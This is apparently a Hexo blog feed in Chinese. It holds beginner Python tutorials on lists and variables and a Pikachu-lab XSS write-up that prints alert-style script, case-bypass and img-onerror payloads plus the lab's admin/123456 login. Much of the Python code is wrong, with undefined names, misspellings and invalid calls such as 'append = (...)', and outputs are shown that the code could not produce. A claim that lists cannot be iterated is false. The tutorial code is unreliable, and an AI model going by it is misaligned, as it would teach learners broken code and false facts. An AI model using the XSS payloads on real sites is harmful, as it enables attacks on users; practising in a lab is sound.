class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">squares = []</span><br><span class="line">for value in range(1,11):</span><br><span class="line">squares.append(square**2)</span><br><span class="line">print(squares)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><p>当然,python中也有一些库函数可以方便你运算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">digits = [1,2,3,4,5,6,7,8,9]</span><br><span class="line">print(min(digits))</span><br><span class="line">print(max(digits))</span><br><span class="line">print(sum(digits))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">9</span><br><span class="line">45</span><br></pre></td></tr></table></figure><p>值得注意的是，这里的digits不能使用for循环，原因是不能迭代</p><h6 id="列表解析"><a href="#列表解析" class="headerlink" title="列表解析"></a>列表解析</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">squares = [value**2 for value in range(1,11)]</span><br><span class="line">print(squares)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span><br></pre></td></tr></table></figure><p>这个列表中的意思是首先制定一个描述性的列表名squares，然后制定一个左方括号，并且定义一个表达式，用于生成要存储到列表中的值，接下来，编写一个for循环，用于给表达式提供值，在加上右方括号。</p><h5 id="使用列表的一部分"><a href="#使用列表的一部分" class="headerlink" title="使用列表的一部分"></a>使用列表的一部分</h5><h6 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player = [&#x27;ann&#x27;,&#x27;bee&#x27;,&#x27;c++&#x27;,&#x27;dev&#x27;]</span><br><span class="line">print(player[0:2])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;ann&#x27;, &#x27;bee&#x27;]</span><br></pre></td></tr></table></figure><p>上述语言中[:]分号是到的意思，比如说0:2是索引为0的数到索引为1的数的，[1:]是索引为1的数到末尾的，[:2]是索引为0的数到索引为2 的数</p><p>当然，如果你要输出在结尾附近的，你可以用这样的形式[-3:]</p><p>当然，列表也是可以遍历和复制的</p><h5 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h5><p>元组看起来很像列表，但其实是不一样的，元组使用的是圆括号而不是方括号</p><p>需要注意的是Python是禁止修改元组的值的</p><p>所以要想修改元组的值，只能从头重新定义一个元组。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;^v^&gt;整个花活&lt;^v^&gt;</title>
      <link href="/2023/03/21/%E6%95%B4%E4%B8%AA%E8%8A%B1%E6%B4%BB/"/>
      <url>/2023/03/21/%E6%95%B4%E4%B8%AA%E8%8A%B1%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [6,6,6]</span><br><span class="line">i = 100</span><br><span class="line">while 1:</span><br><span class="line">    for i in range(i+1):</span><br><span class="line">         i=i+1</span><br><span class="line">         print(a*6,&quot;\n&quot;)</span><br></pre></td></tr></table></figure><p>想法来源@一般路过小辉夜（姬）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 奇形怪状 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu----xss</title>
      <link href="/2023/03/21/pikachu---xss/"/>
      <url>/2023/03/21/pikachu---xss/</url>
      
        <content type="html"><![CDATA[<h3 id="XSS（跨站脚本）"><a href="#XSS（跨站脚本）" class="headerlink" title="XSS（跨站脚本）"></a>XSS（跨站脚本）</h3><p>cross-site scripting，简称CSS，但是前端叠层样式表缩写也是css，所以就叫xss喽</p><p>反射型XSS</p><p>存储型XSS</p><p>DOM型XSS</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>一种非持久的攻击，做法是：恶意攻击者往web页面中插入恶意代码，当用户浏览这一页的时候，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。这里的恶意插入的代码并没有保存在目标页面中，需要引诱用户点击一个链接到目标网站的恶意链接来实施攻击。</p><p><a href="https://blog.csdn.net/bwxzdjn/article/details/123645177">https://blog.csdn.net/bwxzdjn/article/details/123645177</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">简单来说就是</span><br><span class="line">网站上附着一个链接，这个链接是恶意攻击者的恶意链接，用户点进去以后就会进入恶意攻击者的网站，恶意攻击者就会知道用户的信息</span><br></pre></td></tr></table></figure><p><img src="https://typorazhd.oss-cn-beijing.aliyuncs.com/image-20221208143205877.png" alt="image-20221208143205877"></p><h4 id="pikuchu靶场反射型xss-get"><a href="#pikuchu靶场反射型xss-get" class="headerlink" title="pikuchu靶场反射型xss(get)"></a>pikuchu靶场反射型xss(get)</h4><p>随便输入一个’”&lt;&gt;输出结果是</p><p><img src="https://s2.loli.net/2023/03/21/elbXhvtZz8iro7k.png" alt="image-20230321135824714.png"></p><p>这能忍？反手就是一个ctrl -u</p><p>（这里我是页面自动翻译了，理论上应该是who is ‘“&lt;&gt;,i don’t care）</p><p>直接Ctrl -f搜索who is </p><p><img src="https://s2.loli.net/2023/03/21/1iwplsH72PL3qJD.png" alt="image-20230321135703131.png"></p><p>好，确定是反射型的xss(好像说了句废话的骄傲)</p><p><img src="https://s2.loli.net/2023/03/21/9DiamckuOMgP2G7.png" alt="image-20230321142115407.png"></p><p>这里看到了限制字符长度是20，弹药输入的肯定高于20个，需要在控制台中修改</p><p>打开控制台，搜索maxlength的时候无意中发现这么一个东西</p><p><img src="https://s2.loli.net/2023/03/21/LJbPXwfscC7hixF.png" alt="image-20230321142052781.png"></p><p>输进去瞅瞅</p><p><img src="https://s2.loli.net/2023/03/21/pBT5HWQKe4nJvYz.png" alt="image-20230321142240712.png"></p><p>挖趣，他真的，我哭死</p><p>但这也不能阻止我搞他</p><p>输入<script>alert("xss")<script>构建弹窗</p><p>很好，没有弹</p><p>问题出在<script>alert("xss")</script></p><p><img src="https://s2.loli.net/2023/03/21/5jwvFCxpzlZ8WJU.png" alt="image-20230321142623029.png"></p><p>呜呼~起飞</p><h4 id="pikuchu靶场存储型xss"><a href="#pikuchu靶场存储型xss" class="headerlink" title="pikuchu靶场存储型xss"></a>pikuchu靶场存储型xss</h4><p>据说存储型的和反射型的原理是一样的，但是存储型的是</p><p>持久性的，他会将你输入的注入到后端数据库去</p><p>存储型和反射型的差别在于我们每次去刷新页面还是会弹出这个窗口，因为我们刚才的留言已经保存在数据库里了。我们每次打开网页，都会从数据库中把这个留言加载出来，触发这个脚本的运行。</p><p>所以这道题我直接删payload了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alter(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="pikuchu靶场DOM型xss"><a href="#pikuchu靶场DOM型xss" class="headerlink" title="pikuchu靶场DOM型xss"></a>pikuchu靶场DOM型xss</h4><p>Hexo不好贴图，我就放在了有道云里面</p><h4 id="pikachu靶场盲打"><a href="#pikachu靶场盲打" class="headerlink" title="pikachu靶场盲打"></a>pikachu靶场盲打</h4><p>并不是一种xss漏洞的类型，其实说的是一种xss的攻击场景。</p><p>我直接输入<img src="https://img2020.cnblogs.com/blog/1835697/202003/1835697-20200331205008263-436500120.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>正面一无所有，所以我看了眼提示进了后台，账号admin密码123456提示里面有，进入以后就弹出了xss的通知</p><h4 id="pikachu靶场过滤"><a href="#pikachu靶场过滤" class="headerlink" title="pikachu靶场过滤"></a>pikachu靶场过滤</h4><p><img src="https://img2020.cnblogs.com/blog/1835697/202003/1835697-20200331210842442-1573747322.png" alt="img"></p><p>绕过姿势我看了几种</p><ol><li><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRiPt&gt;alert(&quot;xsS&quot;)&lt;/ScRiPt&gt;</span><br></pre></td></tr></table></figure></li><li><h5 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=alert(&quot;xss&quot;) /&gt; </span><br></pre></td></tr></table></figure></li></ol><h4 id="pikachu靶场htmlspecialchars"><a href="#pikachu靶场htmlspecialchars" class="headerlink" title="pikachu靶场htmlspecialchars"></a>pikachu靶场htmlspecialchars</h4><p><img src="https://img2020.cnblogs.com/blog/1835697/202003/1835697-20200331213849221-1479876068.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python:从入门到入土---列表</title>
      <link href="/2023/03/20/Pyhton--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%88%97%E8%A1%A8/"/>
      <url>/2023/03/20/Pyhton--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h6 id="列表是什么？"><a href="#列表是什么？" class="headerlink" title="列表是什么？"></a>列表是什么？</h6><p>列表由一些列按照特定顺序排列而成的元素。</p><p>在Python中，由[]表示列表，并用“，”分隔开其中的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><p>这样的话会打印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br></pre></td></tr></table></figure><p>没错，他会连着【】一块打印下来，没想到吧</p><h6 id="访问列表元素"><a href="#访问列表元素" class="headerlink" title="访问列表元素"></a>访问列表元素</h6><p>列表式有序集合，所以要访问列表式只需要将该元素的索引告诉Python就好。</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle[0])</span><br></pre></td></tr></table></figure><p>当你请求访问列表元素时，Python只会返回该元素，而不包括【】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trek</span><br></pre></td></tr></table></figure><p>当然你也可以使用之前学习过的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle[0].title())</span><br></pre></td></tr></table></figure><p>这样的话会输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trek</span><br></pre></td></tr></table></figure><p>值得一提的是</p><p>索引是从0开始而并不是1开始</p><p>在Python中，第一个列表元素的索引为0而不是1.(这一点 就跟C语言的数组那块一样，都是从0开始的)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle[1])</span><br><span class="line">print(bicycle[2])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cannondale</span><br><span class="line">redline</span><br></pre></td></tr></table></figure><p>当你想要倒过来访问列表的时候，Python会提供给你一种特殊的语法。通过将索引定位为-1，可让Python返回最后一个列表元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle[-1])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redline</span><br></pre></td></tr></table></figure><h5 id="修改添加和删除元素"><a href="#修改添加和删除元素" class="headerlink" title="修改添加和删除元素"></a>修改添加和删除元素</h5><h6 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h6><p>很简单，用索引定位就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle[0] = &#x27;baba&#x27;</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">[&#x27;baba&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br></pre></td></tr></table></figure><h6 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h6><p>在列表未添加元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.append</span><br></pre></td></tr></table></figure><p>这是一个很神奇的东西，他可以让你在列表的末尾添加元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle.append = (&#x27;ca&#x27;)</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;&#x27;ca&#x27;</span><br></pre></td></tr></table></figure><p>当然，如果你足够闲得无聊，你也来可以尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name = []</span><br><span class="line">name.append=(&#x27;zgh&#x27;)</span><br><span class="line">nmae.append=(&#x27;cjy&#x27;)</span><br><span class="line">nmae.append=(&#x27;czm&#x27;)</span><br><span class="line">nmae.append=(&#x27;dyf&#x27;)</span><br><span class="line">nmae.append=(&#x27;czh&#x27;)</span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;cgh&#x27;,&#x27;cjy&#x27;,&#x27;czm&#x27;,&#x27;dlf&#x27;,&#x27;czh&#x27;]</span><br></pre></td></tr></table></figure><p>有了在末尾添加当然就有在中间添加了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle.insect = (1,&#x27;ca&#x27;)</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">&#x27;trek&#x27;,&#x27;ca&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br></pre></td></tr></table></figure><h6 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">del bicycle[0]</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br></pre></td></tr></table></figure><p>使用del可以无线删除，当然，前提是你知道这个元素在Python中的索引值</p><h6 id="当然你也可以使用方法pop-删除"><a href="#当然你也可以使用方法pop-删除" class="headerlink" title="当然你也可以使用方法pop()删除"></a>当然你也可以使用方法pop()删除</h6><p>（我感觉这个列表就像一个栈，pop使用就像弹出这个栈顶）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">outdate = bicycle.pop()</span><br><span class="line">print(bicycle)</span><br><span class="line">print(outdate)</span><br><span class="line">（这一块本来我打算用popped的，但@一般路过小辉夜给了更好的建议，所以就用outdata了）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">‘trek’&#x27;cannondale&#x27;</span><br><span class="line">&#x27;redline&#x27;</span><br></pre></td></tr></table></figure><h6 id="弹出任何位置的元素"><a href="#弹出任何位置的元素" class="headerlink" title="弹出任何位置的元素"></a>弹出任何位置的元素</h6><p>其实吧，pop这个东西不知能删除最后一个元素，你只要在括号里面填写你想要的元素的索引，他都能给你弹出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">outdate = bicycle.pop(1)</span><br><span class="line">print(bicycle)</span><br><span class="line">print(outdate)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">&#x27;trek,&#x27;redline&#x27;</span><br><span class="line">&#x27;cannondale&#x27;</span><br></pre></td></tr></table></figure><p>需要注意的是，当你弹出元素的时候，这个元素就不在列表中了</p><p>根据特定的值删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle.remove(&#x27;cannondale&#x27;)</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">[&#x27;trek&#x27;,redline&#x27;]</span><br></pre></td></tr></table></figure><p>使用remove的时候也可以照常使用这个值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">abb = &#x27;cannondale&#x27;</span><br><span class="line">bicycle.remove(&#x27;cannondale&#x27;)</span><br><span class="line">print(f&quot;&#123;abb.title()&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;, &#x27;cannondale&#x27;, &#x27;redline&#x27;]</span><br><span class="line">Cannondale</span><br></pre></td></tr></table></figure><h6 id="组织列表"><a href="#组织列表" class="headerlink" title="组织列表"></a>组织列表</h6><p>sort（）</p><h6 id="使用sort（）可以将列表进行用就行排序（这个是按照字母进行排序的）"><a href="#使用sort（）可以将列表进行用就行排序（这个是按照字母进行排序的）" class="headerlink" title="使用sort（）可以将列表进行用就行排序（这个是按照字母进行排序的）"></a>使用sort（）可以将列表进行用就行排序（这个是按照字母进行排序的）</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">bicycle.sort()</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;cannondale&#x27;,&#x27;redline&#x27;,&#x27;trek&#x27;]</span><br></pre></td></tr></table></figure><p>当你要逆字母方向时，需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">bicycle.sort(reverse = True)</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;, &#x27;redline&#x27;, &#x27;cannondale&#x27;]</span><br></pre></td></tr></table></figure><h6 id="使用sorted函数进行临时性的排序"><a href="#使用sorted函数进行临时性的排序" class="headerlink" title="使用sorted函数进行临时性的排序"></a>使用sorted函数进行临时性的排序</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">print(sorted(bicycle))</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;, &#x27;cannondale&#x27;, &#x27;redline&#x27;]</span><br><span class="line">[&#x27;cannondale&#x27;, &#x27;redline&#x27;, &#x27;trek&#x27;]</span><br><span class="line">[&#x27;trek&#x27;, &#x27;cannondale&#x27;, &#x27;redline&#x27;]</span><br></pre></td></tr></table></figure><h6 id="倒着打印列表"><a href="#倒着打印列表" class="headerlink" title="倒着打印列表"></a>倒着打印列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle.reverse()</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;, &#x27;cannondale&#x27;, &#x27;redline&#x27;]</span><br><span class="line">[&#x27;redline&#x27;, &#x27;cannondale&#x27;, &#x27;trek&#x27;]</span><br></pre></td></tr></table></figure><h6 id="确定列表长度"><a href="#确定列表长度" class="headerlink" title="确定列表长度"></a>确定列表长度</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">&gt;&gt;&gt;len(bicycle)</span><br><span class="line">3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统教程</title>
      <link href="/2023/03/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%95%99%E7%A8%8B/"/>
      <url>/2023/03/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>操作系统教程</p><p>之前用有道云笔记写的，懒得在搬运一遍了</p><p>（主要是添加图片太麻烦了）</p><p><a href="https://note.youdao.com/s/8SpqhXQY">https://note.youdao.com/s/8SpqhXQY</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python:从入门到入土---变量和基本数据类型</title>
      <link href="/2023/03/19/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F---%E5%8F%98%E9%87%8F%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/03/19/Python--%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F---%E5%8F%98%E9%87%8F%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h6 id="第一个python代码"><a href="#第一个python代码" class="headerlink" title="第一个python代码"></a>第一个python代码</h6><p>无疑是永远の<br>    ·Hello,world<br>与C语言不同の是，python使用の是print而非printf,其次，python中不需要像C语言那样频繁地输入;结束，Python中换行即是结束语句<br>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Hello,world&quot;)</span><br></pre></td></tr></table></figure><p>输出の结果就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,world</span><br></pre></td></tr></table></figure><p>当然你也可以选择设置一个变量来指向“Hello,world”这个值<br>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message=&quot;Hello,world&quot;</span><br><span class="line">print(&quot;message&quot;)</span><br></pre></td></tr></table></figure><p>运行这个程序就会输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,world</span><br></pre></td></tr></table></figure><p>下面来拓展这个程序：使得message指向另外一个值</p><figure 